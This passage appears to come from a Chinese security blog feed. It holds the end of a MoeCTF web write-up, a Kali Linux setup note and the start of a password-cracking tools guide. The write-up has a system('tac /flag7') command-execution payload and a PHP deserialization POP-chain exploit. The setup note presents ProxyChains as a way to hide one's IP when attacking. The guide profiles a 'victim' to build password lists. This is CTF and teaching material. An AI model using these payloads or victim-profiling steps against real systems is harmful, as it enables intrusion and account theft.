<span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你就这么直接？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>burp抓包发送</p><pre class="language-markup" data-language="markup"><code class="language-markup">恭喜，我相信你已经深刻了解了前端不可信任的道理!flag5: fSV90aDF</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag6diw.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag6: xxx"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>提示已经很明显了，大小写绕过</p><pre class="language-markup" data-language="markup"><code class="language-markup">flag6: rZV9VX2t</code></pre><p><img src="7ball_4.png" loading="lazy"></p><pre class="language-markup" data-language="markup"><code class="language-markup">POST: what=system('tac /flag7');flag7:rbm93X1dlQn0=</code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">flag: bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0= base64-->      moectf&#123;AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB&#125;</code></pre><h4 id="pop-moe"><a href="#pop-moe" class="headerlink" title="pop moe"></a>pop moe</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$what</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FAILED TO ATTACK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">what</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">payload</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$sec</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dangerous</span><span class="token punctuation">(</span><span class="token variable">$whaattt</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$whaattt</span><span class="token operator">-></span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evvval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mystr</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>可以利用的函数是<code>class003</code>类的<code>evvval</code>函数里的<code>eval</code>，然后反推看看怎么触发。</p><p>1.<code>class002</code>类的<code>dangerous</code>函数，如果<code>$whaattt</code>为<code>class003</code>类，就可以触发<code>evvval</code></p><p>2.同类下的<code>__set</code>可以触发<code>dangerous</code>，<code>$b</code>为<code>dangerous</code>，<code>$sec</code>就是要传递的参数，就是<code>class003</code></p><p>3.同时我们发现一个问题，如果此时<code>$sec</code>为<code>class003</code>，那么作为<code>evvval</code>函数的参数，要求传入的变量是字符串，但是我们传入的是一个类，进而就会触发<code>__tostring</code>函数，返回~类的<code>$mystr</code>，所以只要给<code>$mystr</code>赋值，就解决了<code>eval</code>函数的参数问题</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- 把类当作字符串使用时触发</span></code></pre><p>4.接着反向分析，如何触发<code>__set</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- 用于将数据写入不可访问的属性</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Jay"</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"David"</span><span class="token punctuation">;</span>  <span class="token comment"># 因为name为私有变量，所以一般来说无法直接赋值的，所以此时会触发__set魔术方法</span><span class="token keyword">echo</span> <span class="token variable">$test</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>  <span class="token comment"># 输出"David"</span></code></pre><p>在class001类中<code>__invoke</code>函数，如果<code>$a</code>为<code>class002</code>，那么在<code>class002</code>中并没有<code>payload</code>这样的属性，于是会触发<code>class002</code>中的<code>__set</code>，此时<code>$this-&gt;payl0ad</code>即为上述例子中的<code>$input</code>，也是题目中<code>__set</code>中的<code>$b</code>，所以只需要让<code>$payl0ad</code>为<code>dangerous</code>即可</p><p>5.如何触发<code>__invoke</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ 当尝试将对象调用为函数时触发</span></code></pre><p>很容易发现只需要将<code>class000</code>类中的<code>$what</code>赋值为<code>class001</code>即可触发<code>__invoke()</code></p><p>至此，完整的pop链为</p><pre class="language-php" data-language="php"><code class="language-php">class000<span class="token operator">.</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class000</span><span class="token operator">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class001</span><span class="token operator">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class002</span><span class="token operator">.</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class002</span><span class="token operator">.</span><span class="token function">dangerous</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class003</span><span class="token operator">.</span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class003</span><span class="token operator">.</span><span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>POC:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$what</span><span class="token punctuation">;</span> <span class="token comment">// protected</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dangerous'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sec</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">class001</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class002</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">sec</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class003</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">sec</span><span class="token operator">-></span><span class="token property">mystr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">moectf&#123;1T_sEEmS_tH@t-YOU_Know-WH4t-is-pOP-lN_pHPpPpPPp!!!39&#125; </code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KaliLinux的基本配置</title>
      <link href="/2024/08/09/KaliLinux%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/08/09/KaliLinux%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>起因是我的kali虚拟机突然崩溃了，查了很多资料也都是推荐重装，也没有很重要的东西，但一些基本配置还是需要的</p><p>至于下载安装网上教程很多，大部分都是跟着默认选项即可。</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><p>大部分linux都是命令行模式较多，所以ssh连接也非常重要</p><h5 id="编辑ssh配置文件"><a href="#编辑ssh配置文件" class="headerlink" title="编辑ssh配置文件"></a>编辑ssh配置文件</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span class="token comment"># 这里我使用的编辑器是vim 其他也可以</span></code></pre><p><img src="ssh.png" loading="lazy"></p><p>将<code>PermitRootLogin</code>后的内容改为<code>yes</code>并取消和<code>PubkeyAuthentication</code>前面的注释</p><h5 id="重启ssh服务"><a href="#重启ssh服务" class="headerlink" title="重启ssh服务"></a>重启ssh服务</h5><pre class="language-bash" data-language="bash"><code class="language-bash">/etc/init.d/ssh restart</code></pre><h5 id="ssh服务自启"><a href="#ssh服务自启" class="headerlink" title="ssh服务自启"></a>ssh服务自启</h5><pre class="language-bash" data-language="bash"><code class="language-bash">update-rc.d <span class="token function">ssh</span> <span class="token builtin class-name">enable</span></code></pre><h5 id="ssh连接-1"><a href="#ssh连接-1" class="headerlink" title="ssh连接"></a>ssh连接</h5><p>首先使用<code>ifconfig</code>查看自己的IP地址，这里我使用的是Xshell</p><p><img src="ssh_2.png" loading="lazy"></p><p>主机填写自己查询出来的IP，端口为22(linux一般默认都是22)</p><p><img src="ssh_3.png" loading="lazy"></p><p>然后填写自己的用户密码连接</p><h4 id="更换国内镜像源"><a href="#更换国内镜像源" class="headerlink" title="更换国内镜像源"></a>更换国内镜像源</h4><p>由于某些原因，导致通过官方镜像源下载速度变慢，这时我们可以将源修改为国内的镜像源。这样做有很多好处，比如提高下载速度，提高稳定性，国内镜像源在国内访问更为顺畅，不容易出现网络波动导致的下载失败；减少延迟，访问本地镜像源可以有效减少网络延迟，提升系统更新和软件安装的效率。</p><h5 id="编辑apt配置文件"><a href="#编辑apt配置文件" class="headerlink" title="编辑apt配置文件"></a>编辑apt配置文件</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/apt/sources.list</code></pre><h5 id="替换国内源"><a href="#替换国内源" class="headerlink" title="替换国内源"></a>替换国内源</h5><p>注释掉官方源，挑选任意源加入即可</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 阿里云</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="token comment"># 清华大学</span>deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<span class="token comment"># 中科大</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><h5 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> update  <span class="token comment"># 更新源</span><span class="token function">apt</span> upgrade <span class="token comment"># 测试镜像源</span></code></pre><h4 id="安装输入法"><a href="#安装输入法" class="headerlink" title="安装输入法"></a>安装输入法</h4><p>这里以ibus输入法为例</p><p>安装输入法框架</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ibus ibus-pinyin</code></pre><p>然后重启</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">reboot</span></code></pre><p>然后配置ibus添加中文即可</p><h4 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h4><p>Kali中内置了ProxyChains开源代理工具，通过使用这个工具，可以让我们隐藏真实ip实现攻击、代理上网等</p><p>使用<code>ProxyChains</code>，用户可以在Kali Linux中配置不同类型的代理服务器，包括<code>HTTP</code>、<code>SOCKS4</code>和<code>SOCKS5</code>代理。此外，用户还可以为不同的目标指定不同的代理服务器，以确保他们的行为不被检测到或跟踪。</p><h5 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf</code></pre><p><img src="proxy.png" loading="lazy"></p><p>注释<code>strict_chain</code></p><p>取消<code>dynamic_chain</code>的注释</p><p>然后移至最后一行，填写对应IP和端口</p><p>我这里使用的是clash for Windows，虚拟机采用NAT连接</p><p>首先在Windows cmd下<code>ipconfig</code>，查询NAT模式的IP</p><p><img src="proxy_2.png" loading="lazy"></p><p><img src="proxy_3.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">socks4 <span class="token number">192.168</span>.2.1 <span class="token number">7890</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字典生成与密码爆破</title>
      <link href="/2024/08/08/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E4%B8%8E%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
      <url>/2024/08/08/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E4%B8%8E%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="字典生成工具"><a href="#字典生成工具" class="headerlink" title="字典生成工具"></a>字典生成工具</h3><h4 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><pre class="language-http" data-language="http"><code class="language-http"># 源码<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//github.com/crunchsec/crunch</span></span></code></pre><p><strong>Crunch</strong>为<strong>kali</strong>自带工具之一，是一种自定义创建密码字典工具，按照指定的规则生成密码字典，可以针对性的生成字典文件</p><h5 id="使用语法和参数"><a href="#使用语法和参数" class="headerlink" title="使用语法和参数"></a>使用语法和参数</h5><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token operator">&lt;</span>min<span class="token operator">></span> <span class="token operator">&lt;</span>max<span class="token operator">></span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span></code></pre><p>参数详解</p><pre class="language-bash" data-language="bash"><code class="language-bash">min    设定最小字符串长度（必选）max    设定最大字符串长度（必选）oprions<span class="token parameter variable">-b</span>     指定文件输出的大小，避免字典文件过大  <span class="token parameter variable">-c</span>     指定文件输出的行数，即包含密码的个数<span class="token parameter variable">-d</span>     限制相同元素出现的次数<span class="token parameter variable">-e</span>     定义停止字符，即到该字符串就停止生成<span class="token parameter variable">-f</span>     调用库文件（/etc/share/crunch/charset.lst）<span class="token parameter variable">-i</span>     改变输出格式，即aaa,aab -<span class="token operator">></span> aaa,baa<span class="token parameter variable">-I</span>     通常与-t联合使用，表明该字符为实义字符<span class="token parameter variable">-m</span>     通常与-p搭配<span class="token parameter variable">-o</span>     将密码保存到指定文件<span class="token parameter variable">-p</span>     指定元素以组合的方式进行<span class="token parameter variable">-q</span>     读取密码文件，即读取pass.txt<span class="token parameter variable">-r</span>     定义重某一字符串重新开始<span class="token parameter variable">-s</span>     指定一个开始的字符，即从自己定义的密码xxxx开始<span class="token parameter variable">-t</span>     指定密码输出的格式<span class="token parameter variable">-u</span>     禁止打印百分比（必须为最后一个选项）<span class="token parameter variable">-z</span>     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  </code></pre><p>特殊字符</p><pre class="language-bash" data-language="bash"><code class="language-bash">%      代表数字^      代表特殊符号@      代表小写字母,      代表大写字符   </code></pre><h5 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h5><p>1.生成最小为5,最大为6，用自己指定的字符abcdef(默认为26个小写字母为元素的所有组合)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">5</span> <span class="token number">6</span> abcdef</code></pre><p>2.生成最小为5,最大为6，由abcdefg和空格为元素的所有组合(&#x2F;代表空格)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">5</span> <span class="token number">6</span> abcdefg\ 或者 crunch <span class="token number">5</span> <span class="token number">6</span> <span class="token string">"abcdefg "</span></code></pre><p>3.多种组合 生成3个元素的组合，前三位为定义的字符串</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">3</span> <span class="token number">3</span> <span class="token parameter variable">-t</span> d@% <span class="token parameter variable">-p</span> aaa bbb </code></pre><p>4.生成几个元素的组合（可以用于社工中收集的信息）</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token operator">-</span>p zhangsan <span class="token number">2018</span> <span class="token number">0101</span> <span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>5.生成指定的字符串（比如生成编号，手机号等）</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">10</span> <span class="token number">10</span> <span class="token operator">-</span>t <span class="token number">201800</span><span class="token operator">%</span><span class="token operator">%</span><span class="token operator">%</span><span class="token operator">%</span></code></pre><p><img src="crunch.png" loading="lazy"></p><p>6.通过-l参数来使@,%^等特殊字符输出</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">7</span> <span class="token number">7</span> <span class="token parameter variable">-t</span> p@ss,%^ <span class="token parameter variable">-l</span> a@aaaaa</code></pre><p>7.-o参数也可使用&gt;&gt;来简化</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token parameter variable">-d</span> <span class="token number">2</span>@ <span class="token parameter variable">-t</span> @@@% <span class="token operator">>></span> test.txt</code></pre><h5 id="调用密码库"><a href="#调用密码库" class="headerlink" title="调用密码库"></a>调用密码库</h5><p><img src="crunch_2.png" loading="lazy"></p><p>特殊字符</p><pre class="language-bash" data-language="bash"><code class="language-bash">numeric     表示0123456789Lalpha      表示26位小写字母Ualpha      表示26位大写字母</code></pre><p>实例：调用密码库 charset.lst中的 hex-upper项目字符，生成4位密码，其中格式为@ + hex-upper +% +%</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token parameter variable">-f</span> charset.lst hex-upper <span class="token parameter variable">-t</span> @@%% <span class="token parameter variable">-l</span> @aaa</code></pre><h4 id="cupp-ccupp"><a href="#cupp-ccupp" class="headerlink" title="cupp(ccupp)"></a>cupp(ccupp)</h4><h5 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h5><p>cupp是一款基于python编写的可交互性的密码字典生成工具。结合社会工程学，你会获得一份根据个人信息生成的专属字典。</p><p>与传统字典相比，其优势在于准确率更高</p><h5 id="cupp常用命令"><a href="#cupp常用命令" class="headerlink" title="cupp常用命令"></a>cupp常用命令</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span>常看帮助信息<span class="token parameter variable">-i</span>通过填写信息创建用户密码字典<span class="token parameter variable">-w</span>在已存在的字典进行扩展<span class="token parameter variable">-l</span>从github仓库下载字典<span class="token parameter variable">-v</span>查看版本信息<span class="token parameter variable">-q</span>安静模式</code></pre><h5 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h5><ol><li><p>运行命令”cupp -i”,填写受害人姓、名、绰号、生日。</p></li><li><p>填写受害人配偶的名字、绰号、生日</p></li><li><p>填写孩子的名字、绰号、生日</p></li><li><p>填写宠物的名字以及公司的名字</p></li><li><p>是否添加一些关于受害人的关键词</p></li><li><p>是否在密码结尾添加一些特殊字符</p></li><li><p>是否在密码结尾添加一些随机数字</p></li><li><p>填写”y”，生成字典，可以在root目录下查看</p></li></ol><p>运行命令 “cupp -l” ,填写你想要下载字典的序号，下载完成的字典保存在”&#x2F;root&#x2F;dictionaries&#x2F;chinese”目录下。</p><h3 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h3><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p><a href="https://www.freebuf.com/column/163553.html">史上最详[ZI]细[DUO]的wfuzz中文教程（一）——初识wfuzz</a></p><p><a href="https://www.ddosi.org/wfuzz-guide/">Wfuzz详细指南|模糊测试工具使用方法</a></p><h5 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h5><p>wfuzz 